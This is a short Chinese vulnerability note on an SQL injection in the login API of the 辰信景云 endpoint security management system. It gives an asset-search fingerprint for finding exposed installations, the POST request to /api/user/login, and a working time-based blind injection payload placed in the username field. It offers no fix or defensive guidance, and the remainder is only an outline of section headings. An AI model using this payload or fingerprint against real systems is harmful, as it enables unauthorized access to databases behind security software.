# 辰信景云终端安全管理系统login存在SQL注入漏洞

- **系统**：辰信景云终端安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="辰信领创-景云终端安全管理系统"`
- **请求**：`POST /api/user/login HTTP/2`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 102`

**请求体 / payload**
```
captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
```

**其他**
- 辰信景云终端安全管理系统 login 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复习
***
- 版本: * 辰信景云终端安全管理系统